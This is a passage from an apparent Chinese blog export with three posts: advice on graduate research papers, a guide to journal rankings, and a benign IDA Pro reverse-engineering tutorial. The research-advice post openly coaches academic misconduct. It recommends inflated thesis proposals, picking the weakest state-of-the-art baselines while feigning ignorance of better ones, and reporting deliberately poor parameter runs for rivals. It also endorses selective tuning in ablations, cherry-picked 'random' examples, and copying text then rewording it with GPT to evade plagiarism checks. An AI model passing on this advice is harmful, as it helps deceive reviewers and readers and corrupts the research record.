告，然后做⼀个ppt去描述你未来要做什么，⽤什么技术做什么，然后下⾯⼀堆专家听了你的讲述后，需要去帮你确定你定的⽅向，未来可不可⾏，需不需要进⾏调整。 莫当真，你就尽管讲你的就好，他们说他们的就好，绝⼤多数导师连⾃ ⼰学⽣做啥，做的什么可⾏不可⾏都不知道，还有⼼思管你，说⽩了，就是上 ⾯把形式做⾜，你把形式⾛⾜即可。 开题报告⼀定不要实事求是。因为开题答辩报告的是你未来要做的⽅向，⾄于你未来是否真的能把这个做出来，你导师不关⼼，答辩台下的⽼师们也不关⼼，那为什么你还要客观事实求是的去讲呢？⽆⾮就是让别⼈看懂了，说你做的东⻄怎么这么简单。 开题报告稍微夸张点，多编点故事，⾄于最后毕业⼤论⽂的时候，能不能做出 来也不是特别重要，毕竟你开题后就能保证⾃⼰开题的东⻄就⼀定能做出来， 怕是叫诸葛亮过来，他都不敢保证吧。并且，最重要的⼀点，你的开题报告只 是作为案底留着，但不会上传到互联⽹，因此也不会查重。多的不能再说了， 小论文三个小实验实验总的来说就是把三个实验做好，通过对⽐试验在指标层⾯证明你做的东⻄ 整体达到了近⼏年⽐较优秀的⽔平；通过消融实验证明你做的东⻄内部的每个 结构都是合理且有效的；实例分析证明你做的东⻄不仅仅在指标上有效，在实 际应⽤上也是⾮常有效的。 对比实验如果你使⽤的裁缝的思想做了 ⼀个C&#x3D;Baseline+A+B，那么对于你需要证明的就是C的性能，也就是你所有东 ⻄拼在⼀起后的性能。 对⽐试验做起来也很简单，就是通过你们领域⼀些通⽤的指标（随便找⼏篇顶 刊顶会就知道是什么通⽤的指标了）进⾏⽐较，⻔道其实也就在这个找和⽐较 上⾯了。 ⾸先找论⽂⼀定是按照你的⽬标论⽂级别找的 顶刊顶会 –》和近三年的顶刊顶会⽐较 ⼀区（国内顶级核⼼、顶会） –》和近⼀年的⼀区、顶刊顶会，去年的顶刊顶 会，前年的顶刊顶会⽐较 ⼆区（国内中等核⼼、中等会议）–》和近⼀年的⼀区、⼆区，去年的⼀区、 顶刊顶会，前年的顶刊顶会⽐较 三区（国内垃圾核⼼、低等会议）–》和近⼀年的⼆区、三区，去年的⼀区、 顶刊顶会，前年的顶刊顶会⽐较 四区（⽔刊、⽔会） –》和近⼀年的三区、四区，去年的⼀区、⼆区、顶刊顶 会，前年的顶刊顶会⽐较 普刊和EI会议 –》随意，对⽐模型是篇论⽂就⾏，甚⾄只要你想，都不需要对⽐ 试验 除了普刊和EI会议，⽆论你发什么级别的SCI，都必须拿上⼏篇顶刊顶会的论⽂来⽐较，此外就是要超过去年⽐你这个级别更⾼的期刊的论⽂，然后 如果今年你们这个领域论⽂出来了，那尽量也要加上⼀两篇今年的论⽂，⽆论级别，因为很多审稿专家不仅看对⽐论⽂的级别，还会看对⽐论⽂的年份。但是⼀定要注意的是，这仅仅是参考，如果你发个三、四区，对⽐试验能吊打近 两年的sota（即性能最好的顶刊顶会），那⼀定会提⾼你论⽂的接受率，因此，教⼤家⼀个⼩trick，怎么吊打sota。 挑选SOTA说⽐不过近两年的sota，即性能⽐较好的论⽂怎么办，其实很简单， 你要知道，sota这个东⻄是个很虚的东⻄，⼈⼈都说⾃⼰是sota，什么叫 sota，近两年性能最好的顶刊顶会，那么是否存在⼀个可能，有⼀个顶刊的论⽂特别⽜，但是你从未看到过这篇论⽂（是，我知道你看过了，但是你就不能 假装你没看到吗？只要你不说你看到过，谁知道你看到过没看到过）。到这就⾮常简单了，你尽量去把你这领域近两年所有的顶刊顶会的⽂章找出来，然后将军⾥挑矮⼦，你挑性能最差的顶刊顶会，和你的⽅法进⾏对⽐试验。其实， 这⾥补充⼀个真相，⼀般很多性能差的顶刊顶会他的贡献点不在性能这⼀块， 但是你就不能假装你不知道这⼀点吗？你只是单纯的看了这篇论⽂的最后的性能这⼀部分⽽已，⽽且我不和你说，你估计也不知道。 你做对⽐试验的时候，只是客观实事求是的表达⾃⼰顶刊顶会进⾏了性能对 ⽐，并没有多说⼀句——我挑了近⼏年最最最优秀的模型和我们⽐较。即使你 说了这句话，优秀⼆字还不是你来定义，通过你定义的优秀然后筛选掉真正优 秀的⽂章，这就是⽔顶刊顶会的基本功了 对比结果⼀般获取对⽐论⽂结果的时候，以他们论⽂⾥的为准，也就是他们论⽂⾥写了多少，你就跟着填多少。如果这篇论⽂⾥没有你这个数据集的结果，你⼜⾮常 想和他⽐较，可以⾃⼰复现他的⽅法跑你的数据集，此时有⼀个科研trick，因为是⽤他的⽅法跑你的数据集，你可以改变实验参数，说⽩了，找个差⼀点的 参数结果，你不说，没⼈知道你跑过什么更好的参数。 这⾥还有⼀个科研trick，如果你复现过某篇论⽂，但是你复现的结果低于论⽂⾥的结果（单纯复现的时候必须使⽤原作者给的参数等等，即你不能对⼈家的 ⽅法试验参数改动⼀丝⼀毫），那就以你复现的为准，也就是说，如果你⽐不过某篇论⽂的结果，可以尝试着复现下，如果复现结果偏低，那就以你复现的 结果为准， 这个时候你只需要再在论⽂⾥附上⼀句，部分论⽂的结果是你复现 的结果即可。当然，可以部分论⽂采⽤原论⽂的结果，部分论⽂采⽤复现的结 果，别太⽼实⼈，没有⼈知道那篇论⽂是否能复现出来。 无通用指标⼀般可以借鉴相似领域的，⽐如诗歌⽣成借鉴词曲⽣成的，如果连相似领域都没有。这就很好办了，继续造航⺟，⾃⼰模仿⼀ 些类似任务的指标构造⽅法进⾏构造，如果你真的要这样做，如果你是研⼀ 的，真的劝退。如果退不了，怎么构造呢？就是去找⼏篇类似任务的论⽂，然 后看看这些论⽂⾥有什么指标可以参考，再去找到以构造你这个可参考的指标 为⼯作的原论⽂，然后尽量模仿，稍有异同就好。 无论文没有对⽐的论⽂，其实做法更简单，挑⼏个更基础更简单的⽅法，然后⾃⼰跑⼀跑，和这些基础简单的⽅法对⽐即可。当然咯，最好的⽅法是你可以挑⼏个听起来很⾼⼤上，但是实验性能很⼀般的⽅法和你⽐较。 消融实验C&#x3D;Baseline+A+B，Baseline⼀般就是别⼈的，A和B是你⾃⼰的⼯作量，那么 你就是要证明在Baseline上单独加上A后性能有了提升，单独加上了B后性能有 了提升，⼀起加上了A和B性能有了提升。 如果你⽤的不是裁缝的思想，就是⾃⼰想办法把你做的东⻄分块成A、B、C， 然后说清楚A、B、C分别解决了什么问题，⼀般A、B、C都是常⻅的领域内模 块或者你设计的模块，那么就是A+B+C⽐A、B、C、A+B、A+C、A+B要好。 A就是⼀个不可分割的实体，B、C都是可分割的⼩组件，⼀般A的体量 远⼤于B和C，消融实验就是要把⼩组件消融掉。这⾥附⼀个⼩trick，⼀个不可分割的实体⼤⼩A，其实⼀定程度由你决定，⼀般如何分割，没有硬性要求， 那你就怎么分割有利，怎么来。 ⾸先讲⼤家最常碰到的⼀个情况吧，C&#x3D;Baseline+A+B，当我们做消融实验时， ⼀起加上A+B有了提升，但是单独的加上A或者单独的加上B是负提升，其实， 只要稍微拐个弯就⾏了，既然加上A是负提升，那么我是否可以把A+B看成⼀个 整体a，也就是我们C&#x3D;Baseline+a，你要清楚地是，审稿专家可以不知道你的a 是A+B，你说他们是⼀个整体，那他们就是⼀个整体。 因为机器学习的底层理论——模型每次找到的是局部最优解，⽽⽆法找到全局最优解，且模型⼀旦变动了，局部最优解寻找的⽅法也会随之改变，即需要调不同的参数来找到更优解。也进⽽导致了Baseline+A、Baseline+B、 Baseline+A+B这四种⽅法在进⾏实验的时候，是不需要共⽤⼀套参数的，那么问题就来了，对于Baseline+A+B⽤最好的参数，Baseline+A⽤稍微普通的参 数，Baseline+B⽤最差的参数只要保证能超过Baseline即可。也就是说，你只要保证Baseline+A、Baseline+B、Baseline+A+B都超过Baseline，然后 Baseline+A、Baseline+B、Baseline+A+B三者内部的⽐较，可以通过不使⽤同⼀套参数的bug，⾃⼰选择性的调参，⾄于Baseline+A+B是否⽤了最好的参数，Baseline+B是否⽤了最差的参数，你不说，⻤知道呢？即使别⼈跑出来了更好的，顶多也就是你没往那个⽅向尝试，这是你复现别⼈代码常有的事，改改别⼈⽅法的参数效果就⽐别⼈⽅法原来的结果好了。 为什么不能给Baseline调参呢？因为Baseline⼤都是来源于他⼈的论⽂， 你不能对别⼈的论⽂动⼑，⽽且⼀定是默认别⼈的论⽂就是把参数调到了极致 找到了他能找到的最优解。因此，还有科研trick，你对Baseline做⼀定的改动，什么改动就⾏，只要做了改动变成了Baseline’，那Baseline’就是你⾃⼰的 模型了，你就可以通过调参的⽅法来使其达到你想要的那个性能。 实例分析对⽐试验、消融实验都是指标上的对⽐，即表格。如果是偏应⽤的领域，⼀定要加上形象⽣动的结果图，即实例分析其实就是通过图⽚的形式体现出你的⽅ 法的优越性，⼀般这种对⽐更多的就是很普通的消融实验，即Baseline+A+B和 Baseline⽐，不⽤太复杂。值得⼀提的是，现在太卷了，消融实验很多⼈都会 放上图来形象化的展示。 ⼀般就是放2或4个实例，以4举例，说⽩了就是找4个数据，然后⽤Baseline和 C&#x3D;Baseline+A+B分别跑这个4个数据，通过图⽚的形式展示这个结果，然后通过⼀些⾮专业术语说清楚你做的C的优越性。 这⾥也有很⼤的操作空间，⼀般我们的数据集都是1000往上，因此我们可以说 我们随机挑选了4个数据，做了实例分析。⾄于这个随机，有没有⼀种可能，我就是命好，真的随机到了最好的4个最好的结果，说⽩了，对⽐试验将军⾥挑矮⼦，实例分析矮⼦⾥挑将军，再说⽩点，对⼀切可以挑选、可以随机的事物， 怎么有利怎么来！ 说⽩了就是很多东⻄怎么有利怎么来，⽽不是怎 么绝对正确怎么来，当然咯，很多事情他是很难绝对正确的才有漏洞可钻。即 使你做了，但是你不说你做了，⻤才知道你做没做，不清楚和没做过⼀点都不 违规，更直⽩点，只要确保我们未来论⽂⾥⾯写的⼀切都是绝对正确的就好， 但是写啥不写啥完全是由你个⼈意志决定的，⾄于漏写了啥很⼤程度是由审稿 ⼈来决定的，爱因斯坦也很难保证相对论⾥的每个点都到位了，每个⼈的知识 都是局限的。我还只是说了⼀部分简单的科研trick，还有各种各样花式trick能 打破你的认知，也许未来会出个专辑专⻔讲讲这件事。 实例演示下图是⼀篇20年的顶会模型图，其实放在当时，可能还是挺新颖的，实则也就 是当年常⻅模块的堆叠（① + ② + ③），但他并不是我们今天的主⻆。 再来看下图⼀篇23年的⼀区top顶刊，这才是真正的主⻆。 他们到底有什么区别呢？两篇论⽂①和②简直就可以说成是⼀模⼀样的东⻄， 只是⼀个Attention这样画的，⼀个Attention那样画的。那23年的顶刊到底做 了什么创新呢？如下图所示，23年的顶刊第⼀个创新是：把20年的顶会的第三 部分从当年常⻅的cross-attention变成如今常⻅的co-attention；第⼆个创新 是：把cross-attention的输出从合并变成了拆分，并去掉了1d CNN。 这篇论⽂的这种做法，只要是⼀个Ai的学⽣，相信没有哪个看不懂的，甚⾄你 不是Ai的，你也⼤概能看懂他的这种骚操作，实际做法并不难。那为什么这种 做法能发顶刊，你却不能呢？不做评价，⾄少别⼈编故事的⽔平还是很⾼超的 小论文三张图摘要图 很多⼈都喜欢在摘要⾥，通过抽象的语句描述你遇到的问题和你想要解决的问 题，这种做法会让审稿专家很厌烦，没⼈想看⼀堆很抽象的⽂字。 这也就是我 们的第⼀张图的作⽤，要放在摘要，去形象具体的描述你的问题，让别⼈看到 这张图就知道你想⼲什么，例如这张图就很清晰的告诉别⼈我们的模型可以通 过帧选择去除冗余帧 方法图第⼆张图就是你的模型框架图，这个就不⽤我细说了吧，就是对你做的⽅法的 细节的演示。这⾥多说⼀嘴，下图的框架图过于复杂了，因此，可以考虑弄⼀ 个缩略的框架图，即只考虑数据流的运转，⽽不要把模型的细节全部绘制出 来。也是说复杂的⽅法图应该⽤两张图来表示，第⼀张是缩略图，不绘制细 节，只说清楚数据流的过程；第⼆张就是对缩略图的扩展，绘制细节。 对于这种框架图的绘制，两种⼯具推荐，visio和亿图图示：亿图图示在线 (edrawmax.cn) 总结图最后，就是我们的第三张图，很多⼈会通过⼀张表格和最近⼏年的模型对⽐， 体现⾃⼰模型的优越性 我们更需要挑⼏个实例，然后通过⼀幅可视化的图来体现我们的模型的 效果很好 上述这三张必不可少，摘要图告诉别⼈你在做什么；⽅ 法图告诉别⼈你怎么做的；总结图告诉别⼈你做的效果怎么样，其余的图看⾃ ⼰情况补充 小论文写法在写⼩论⽂之前，⼀定要定位⽬标期刊，因为我们前⽂说到论⽂其实是在和审稿⼈博弈。 ⽽我们只要定位了⽬标期刊，然后找出该期刊往年的我们领域的所有论⽂，只要仿着这些论⽂写，他们有的你都写上，他们没有的你就不写。这样做的话，很有 可能在这个论⽂⼝味上就符合了这些审稿⼈的⼝味，因为往年的论⽂⼤概率就 是那些审稿⼈审的稿，按照他们的要求改的稿。 亦或者你定位的⽬标期刊 往年没有⼏篇你们领域的论⽂。这样你就要找⼏篇顶刊顶会的论⽂，然后仿着他们的写，他们有的你都要有。 当你找到了⼏篇往年的论⽂之后，写论⽂其实就是很简单的⼀件事，就是纯模仿，他们有的你就加上，他们没有的你屁话都不要多放⼀句。然后对于很多共 通的地⽅，就是这⾥抄⼀点，那⾥抄⼀点，然后降重。 他们放了什么样的图，放了什么样的表格，你就放什么样的图，什么样的表 格。他们⼀篇论⽂分成了⼏个部分，你就分成⼏个部分，他们的论⽂这个部分 是按照什么样的逻辑写的，你就要按照什么样的逻辑写的。 写论⽂⼀定要切记 ⾃我意淫，写论⽂⼀定要切记⾃我意淫，写论⽂⼀定要切记⾃我意淫。 ⼩论⽂⼀定要注意排版不要出问题，学术圈很忌讳这个细节。 对于很多需要论⽂翻译的同学，⼀般SCI四区，说实话，百度翻译都够⽤了，当 然咯，现在gpt也出来了，还是要⽤gpt润⾊下的。 SCI⼆三区，是⼀定要⽤gpt润⾊的，并且有些⼆区对于英⽂的要求还是挺⾼ 的，就需要⽤gpt润⾊后⾃⼰再看看，或者找个英语还过得去的看看。 对于SCI⼀区往上，它们对英⽂的要求还是蛮⾼的，说⽩了就是⽤地道英语，写 出来让英语不是特别好的⼈都看不懂再写啥。这种尽量去找英⽂润⾊机构帮 忙，或者⾃⼰的导师有这样的实⼒也⾏。 ⼀篇⼩论⽂，最有可能会⼤量重复的就是相关⼯作那⾥，但是相关⼯作，你⾃⼰去把把引⽤的论⽂的摘要或总结拔下来，然后⾃⼰找点重点句填进去，基本也很难和其他⼈重复。如果你这⼀句话真的是摘抄别⼈的⼀ 段话，完全可以通过gpt降个重，说⽩了就是先缩写再扩写，然后⾃⼰捋顺⼀ 下。 我上⾯说了那么多想表达什么意思，⼀篇⼩论⽂，能抄的东⻄并不多。 因为⼩论⽂的核⼼是去描述你的创新，⽽不是和⼤论⽂⼀样去描述你的⼯作量，也就是⼩论⽂突出的是你的创新的部分。说⽩了，当你的⼩论⽂还需要不⾃信到通过查重⼯具去查重，总是关⼼是否重复率过⾼，我只能说，你这篇⽂章拒稿的 概率应该是⾮常⼤的，除⾮你投Ei会议和普刊。 其他研究生读研，少问多做，遇到问题百度+GPT+思考 当你被push后再明修栈道暗度陈仓，有些导师会以你笨。对你⼈身攻击，能忍则忍，毕竟现在忍不了，以后社会也会教会你这些，就当提前磨练了。但是别忍出病来了，感觉有点受不了了，找辅导员聊聊。 天下从不会掉⼤饼，感觉⾃⼰得到能得到诺⼤的好处的时候，多掂量下⾃⼰⼏ ⽄⼏两，就不容陷⼊画饼的怪圈中。但是⼀旦被画⼤饼，被push和pua后，⼀ 定要想办法救⾃⼰，示弱、明修栈道暗度陈仓以及万事不得以后的⽃争，⼀定要努⼒让⾃⼰站在舆论的最上⽅，即你该做的，能做的都已经做过了。 记住，研究⽣培养计划就相当于你的卖身契，达到特定要求才能 把你放出去，即研究⽣培养计划外的内容都是扯淡，例如，课题组的要求","categories":[{"name":"AI","slug":"AI","permalink":"https://pa1r0t.github.io/categories/AI/"},{"name":"论文","slug":"AI/论文","permalink":"https://pa1r0t.github.io/categories/AI/%E8%AE%BA%E6%96%87/"}],"tags":[]},{"title":"期刊介绍","slug":"期刊介绍","date":"2024-06-29T02:42:44.000Z","updated":"2024-07-07T03:20:34.906Z","comments":true,"path":"2024/06/29/期刊介绍/","link":"","permalink":"https://pa1r0t.github.io/2024/06/29/%E6%9C%9F%E5%88%8A%E4%BB%8B%E7%BB%8D/","excerpt":"","text":"如何查询期刊查询中文期刊用知网：学校登录：中国知网高校&#x2F;机构外部访问系统 (cnki.net) 期刊导航：出版来源导航 (cnki.net) 查询sci（外文）：地址1：最新SCI期刊影响因子查询及投稿分析系统（2022-2023年）- LetPub 地址2：小木虫论坛-学术科研互动平台 (muchong.com)（一般不用） 查询计算机CCF评级的期刊会议地址：CCF推荐国际学术刊物目录-中国计算机学会 A+会议就是传说中的顶会 期刊分级按刊号所属地划分CN:国内刊号 ISSN:国外刊号 《自动化学报》 ISSN刊号很容易申请，所以一般具有CN的国内期刊都会申请一个ISSN刊号。 按地域划分划分为国家级和省级，一般没有明确规定，都是约定俗成 国家级指国家级单位主管主办，例如《基础教育》由中华人民共和国教育部主管主办 省级一般指各省、自治区等省级部门主管主办的刊物，例如《江西社会科学》，由江西省社会科学院主管主办 核心期刊国内核心核心来源一般由七大核心期刊，一般搜索期刊就会出现期刊属于哪个核心。 北大核心（北大中文核心） ————普及最广 南大核心（中文社会科学引文索引（CSSCI）来源期刊） ————最权威 科技核心（中国科技论文统计源期刊（CSTPCD）） ————知网不标注，医药机构的科核 CSCD（中国科学引文数据库） ————理科 人文社科核心（中国社会科学核心期刊（CHSSCD）） 不同的学校对核心的认同不同。投论文时要注意 想搞科研，往领域内最好的核心期刊投，sci 最好期刊：《自动化学报》《计算机学报》《研究发展》 不想读博，一般是某某大学学报 国际核心 SCI(科学引文索引) 理工科类 JCR划分（Q1、Q2、Q3、Q4，各25%） 按中科院划分（一区（5%）、二区（6-20%）、三区（21-50%）、四区（51-100%）） SSCI（社会科学引文索引） —————属于社会科学 A&amp;HCI（艺术人文引文索引） ————艺术类 EI（工程索引） ESCI、SCI和SCIE的区别ESCI仅满⾜了SCI收录的第⼀级标准，如果满⾜了SCI的所有标准后可以被SCI收 录，⼤家可以理解ESCI期刊是通往SCI的预备阶段。 ⼀般学校不承认ESCI期刊 SCI-E是SCI的扩展版，⽬前SCI收录期刊3600多种，SCIE收录期刊6000多种， 被SCI收录的期刊应该都被SCI-E收，但反之却不成⽴。SCI是核⼼版，SCIE是⾮核⼼版，SCI⽐SCIE更重要；SCIE是⽹络版，SCI是纸质版。 ⼀般学校都会承认SCIE 国际会议核心（ISTP、EI）就是世界各地不定期举办的学术研讨会，针对某个会议主题面向世界征文，后面以此次会议名称为刊名，以会议论文集的形式出版，并递交EI-CA或ISTP数据库检索。 CPCI&#x2F;ISTP（科技会议录索引） ————知名度不高 EI会议（理工科类会议索引） 部分学校不认可会议，EI会议会被认为给钱就就行。 如果研究生认可，可以发这个保底毕业（一般来说给钱就中） 普刊不是核心就是普刊 机构买论文绝大多数是用钱打通审稿人的关系，这就是市场上核心难投，水刊难投的原因 顶刊、权威、A、B、C、D类（学校内部期刊评级）什么是顶刊一般指sci一区top，以letpub搜索的nature为例，会给出是否为top期刊 学校也有期刊的内部评级，一般找辅导员要就行 计算机领域特有的期刊评级（CCF）CCF和SCI区别CCF是计算机领域的权威人士排的评级，而SCI分区是根据期刊影响因子来划分的。 SCI的范围更广，涉及学科更多，CCF更关注计算机领域。 国际期刊一般分为A、B、C三类 大都以SCI为准，部分学校以CCF为准 国内期刊分为T1、T2、T3类 一般就三大期刊，《自动化学报》《计算机学报》《计算机研究发展》和其他 会议CCF会议一般分为A、B、C三个会议，注意很多学校不认可会议 什么是顶会CCF-A或CORE排名中A+或大牛说的 水刊通过百度学术或谷歌学术中找出这两年在letpub或知网上的论文，然后进行期刊级别排名越差的越水 ⼀般⼀篇的论⽂级别好坏，以⼆三区为界限，往上就很难直观的把它定义成⽔⽂，往下⼀般就会直观的把它定义成⽔⽂。因此，我挑⼀篇⼆区的论⽂来给⼤ 家引⼊，即往上很难出现⽐这还离谱的问题，往下出现的问题可能⽐这还离谱。 [置顶]期刊分级下载链接：https://imgmd.oss-cn-shanghai.aliyuncs.com/Bzhan-sou-UID383551518/all_qikan_fenji.pdf 计算机领域的，对CCF排名想要获取的，通过这个下载链接：https://imgmd.oss-cn-shanghai.aliyuncs.com/Bzhan-sou-UID383551518/CCF-qikan-paiming.zip 备用百度网盘链接: https://pan.baidu.com/s/1ntzRhwT9fyHpn6sddy-dFA?pwd=8888 提取码: 8888备用夸克网盘链接：https://pan.quark.cn/s/1d33da813715","categories":[{"name":"AI","slug":"AI","permalink":"https://pa1r0t.github.io/categories/AI/"},{"name":"论文","slug":"AI/论文","permalink":"https://pa1r0t.github.io/categories/AI/%E8%AE%BA%E6%96%87/"}],"tags":[{"name":"期刊","slug":"期刊","permalink":"https://pa1r0t.github.io/tags/%E6%9C%9F%E5%88%8A/"}]},{"title":"机器学习_李宏毅(1)","slug":"机器学习-李宏毅-1","date":"2024-06-25T12:55:04.000Z","updated":"2024-06-25T13:59:15.604Z","comments":true,"path":"2024/06/25/机器学习-李宏毅-1/","link":"","permalink":"https://pa1r0t.github.io/2024/06/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E6%9D%8E%E5%AE%8F%E6%AF%85-1/","excerpt":"李宏毅的课超棒","text":"李宏毅的课超棒","categories":[{"name":"AI","slug":"AI","permalink":"https://pa1r0t.github.io/categories/AI/"},{"name":"机器学习","slug":"AI/机器学习","permalink":"https://pa1r0t.github.io/categories/AI/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"李宏毅","slug":"李宏毅","permalink":"https://pa1r0t.github.io/tags/%E6%9D%8E%E5%AE%8F%E6%AF%85/"}]},{"title":"IDA工具使用","slug":"IDA工具使用","date":"2024-06-24T14:30:05.000Z","updated":"2024-06-25T14:01:15.110Z","comments":true,"path":"2024/06/24/IDA工具使用/","link":"","permalink":"https://pa1r0t.github.io/2024/06/24/IDA%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/","excerpt":"​ IDA逆向神器","text":"​ IDA逆向神器 IDA工具介绍​ IDA Pro（交互式反汇编器专业版，我们一般简称为IDA）是一款递归下降的反汇编器，由Hex-Rays SA发布，是安全从事人员的必备工具之一。它强大的静态反汇编，反编译功能及动态调试功能让我们分析程序变得简单。它支持数十种CPU指令集其中包括[Intel x86](https://baike.baidu.com/item/Intel x86)，x64，MIPS，PowerPC，ARM，Z80，68000，c8051等等，无论是winodws平台下的pe可执行文件，linux平台下的elf文件及ios平台下的Mach-O文件都适用。 一个简单的C语言程序用作实验。 IDA分为32版本与64版本，这是根据所要反汇编程序的位数来区分的，但其实他们自身都是64位的程序。 根据程序的位数选择对应位数的IDA打开程序。（附件是64位的 一般没有特殊需求，我们直接默认点击OK就好了。 点击Ok后接着的各种提示，如加载对应的pdb符号文件，统统点击否，然后进行来到载入主窗口。 然后再关闭IDA,出现下面的提示框。 一般我我们就选择下面标出的2个选项中的一个即可。第一个保存为了下次分析继续使用，另外一个不保存。 上一步点击保存文件退出后，将该exe文件再次重新载入IDA。 overwrite 重新写入，代表覆盖以前的。 load existing 加载已经存在的，就是直接加载我们之前分析过该程序保存的数据库文件，保存了上次的分析记录方便我们继续分析。 IDA功能界面介绍 流程图界面显示对应的伪代码，此界面下按 &#x2F; 即可。 Text-view文本视图 切换图形视图和文本视图（点空格键就行） IDA功能界面介绍导航栏 - 蓝色:.text section - 深蓝:用户写的函数编译后的代码区 - 浅蓝:编译器自己添加的函数，像启动函数，异常函数等等.. - 粉红色:.idata section 有关输入表的一些数据信息 - 军绿色：.rdata section 纯数据，只读 - 灰色:为了段对齐而留下的空隙 - 黑色: 禁区 汇编代码界面注释一种是Enter comment(快捷键是shift+;))，另一种是Enter repeatable comment(快捷键是;和OD一样) 前一种输入的注释只在该处出现，后一种注释，会在所有交叉参考处出现，如果一个程序位置引用了另一个包含可重复注释的位置，则该注释会在第一个位置回显，且以灰色显示。 伪代码代码界面注释，快捷键 &#x2F; 字符串窗口 shift+f12程序中被IDA解析出来的字符串，当然还有因为未解析出来所以没显示的。 导入表窗口程序从动态链接库中导入的要使用的函数。 导出表窗口程序导出给其它程序使用的函数。 十六进制数据窗口类似于一个十六进制编辑工具看文件的二进制信息 函数窗口对于ida没有识别出来的函数，统统以sub_函数地址命名。 为了方便，我们还可以直接在函数窗口ctrl+f，然后搜索目标函数。 结构体窗口这里显示了本次分析程序ida中已经定义了的结构体，同时我们也可以在插入创建新的结构体。 .rdata段中的字符串用于定义字符串都在一块内存区域，根据这个也是定位找字符串的方法。 如下，.rdata段的字符串信息，最右边的是隐式的可重复注释，指示的那里引用了该字符串。 寻找入口点 快捷键 ctrl+e在IDA载入程序分析完毕后，ctrl+e打开选择程序入口点的窗口，这里可以方便找到程序的入口点及用到的回调函数。 地址跳转 快捷键 G按下快捷键 G，输入地址后跳转到目的地址 参考重命名 在变量名下按 n在分析一个程序时，我们可以对一些变量或者函数重命名，改成我们易于我们理解的名字，便于分析程序。 如下，假如我们知道了v12变量是一个计数功能，那我们就可以给他重命名为 count 参考类型修改 在变量名下按 y在分析一个程序时，IDA对一些变量名可能解析的不是很正确，这就需要我们手动去修改变量的类型。 如下所示，在v12变量下按y键后再输入我们要修改的变量类型。 数据转化为代码 在数据开始的地方按 C在分析一个程序时，有时候因为栈帧或者其它原因使IDA不能反编一个函数有问题，又或者程序有smc，我们在手动对数据解码后，接着在解码数据开始的地方按C键就将数据转化为代码了。如下所示，我们在57h的地方按下C键，IDA就会自动对数据解析成代码了。 创建函数 在代码开始的地方按 P如上一步中所说的，我们先对数据按C键将数据转化为了代码，这时候还需要在代码开始的地方按p键，让IDA在将一段代码上创建成一个函数。 如下，可以注意到左边的地址是红色，这时候我们在0x4025A0地址下按p就在这一段汇编创建函数且左边的红色地址消失。 取消定义 在需要取消定义的地方按 U通过在指定的数据或者代码下按U键我们可以取消IDA对该数据的定义，如代码，数组等。 如下，我们在aDS按u键后，得到了下面第二张图的结果。 定义数组 在需要定义为数组的数据开始的地方按 *分析一个程序时，我们有时候在硬编码的数据中看见一段连续的数据且我们确定它为数组，但IDA并没有将其解析为数组，这时候我们就可以在这段数据开始的地方按下*，弹出如下所示的框： 选好满足我们要求的选项后，按ok即可。 提取数据 选中要提取数据后按shift+e在我们需要得到程序中的一段数据时，我们可以先选中这段数据然后按shift+e 如下，我们先选中数据，接着按shift+e后得到下面的第二组图： 标签的使用 加标记：alt+m 跳转到标记：ctrl+m使用标签功能我们可以在程序代码的任何位置快速跳到我们做了标签的地方，这对于快速跳到关键代码的位置是很实用的。 如在下图中，我们知道了0x4015A2地址处是printf的功能，那么我们可以在这个地址下按alt+m,对这个地址加上printf的标记。那么当我们此时在程序任何位置，按crtl+m，选中printf标记就可以快速跳回到这里了。 快捷键 F5 : 反汇编当前函数 ; ：为当前指令添加全文交叉引用的注释 N ：定义或修改名称，通常用来标注函数名 G ：跳转到任意地址 Esc ：返回到跳转前的位置 H ：十六进制显示数据 y ：改变数据类型 X ：查看按上层调用 Space :图形视图和文本视图切换 Shift+f12：字符串窗口列表 二进制搜索：alt+b 文本搜索：alt+t 快照：shift+ctrl+w tab：反编译与流程图切换 alt+a：字符串操作 流程按&#x2F;：流程图加上伪代码 IDA插件的安装若我们有想要安装的插件，直接到将其放到IDA安装目录中的plugins文件夹下即可。 IDA的高级使用ida中字符串搜索的技巧ida中有两种搜索：文本搜索（alt+t），二进制搜索（alt+b） 而文本搜索是很局限的，他只是对在shift+f12中ida已经列出来的字符串中搜索，对于很多很多中文字符串，宽字符它都是搜索不出来的。 所以一般着重使用二进制搜索： 1.对要搜索的十六进制字符串以空格分隔为两位十六进制值组成的列表。 2.要搜索内嵌的字符串数据，必须将要搜索的字符串用双引号括起来。 3.在搜索十六进制字节序列时，最好选中Match_case选项，不然，假如要搜索的序列为：E9 41 C3，而E9 61 C3也出现在了搜索结果中。这是因为，0x41对应于字符A，而0x61则对应于字符a，所以IDA认为这两个字符串相互匹配。 得到一个函数与调用它的函数之间关系图在一个函数的图形化界面右键选择Xref graph to.. 如下得到了main函数与调用main函数之间的关系图 得到一个函数与它调用的函数之间关系图在一个函数的图形化界面右键选择Xref graph from.. 如下得到了main函数与main调用函数之间的关系图 修改字符串窗口的设置以得到尽可能多的字符串有时候我们可能发现程序中长度为4的关键字符串在字符串窗口找不到，其实这是ida中设置的原因，默认字符串窗口能显示的字符串长度为5。 在字符串窗口右键后点击Setup，然后将最小字符串长度改为4就好。 对比源代码中结构的定义与ida对结构体反编译结果来熟悉看伪代码源代码： #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; typedef struct _Link &#123; int data; char a[20]; struct _Link *next; &#125; Link, *pLink; int main(void) &#123; pLink head; Link link, link1; head = &amp;link; link.data = 1; strcpy(link.a, &quot;IDA工具的使用&quot;); link1.data = 2; strcpy(link1.a, &quot;learning!&quot;); link.next = &amp;link1; link1.next = NULL; while(head) &#123; printf(&quot;%d %s\\n&quot;, head-&gt;data, head-&gt;a); head = head-&gt;next; &#125; putchar(10); system(&quot;pause&quot;); return 0; &#125; Ida反编译结果： int __cdecl main(int argc, const char **argv, const char **envp) &#123; Link link; // [rsp+20h] [rbp-50h] BYREF Link link1; // [rsp+40h] [rbp-30h] BYREF pLink head; // [rsp+68h] [rbp-8h] _main(); head = &amp;link; link.data = 1; *(_QWORD *)link.a = 0xB5DFBEA4B9414449ui64; *(_DWORD *)&amp;link.a[8] = -742798652; *(_WORD *)&amp;link.a[12] = 195; link1.data = 2; strcpy(link1.a, &quot;learning!&quot;); link.next = &amp;link1; link1.next = 0i64; while ( head ) &#123; printf(&quot;%d %s\\n&quot;, (unsigned int)head-&gt;data, head-&gt;a); head = 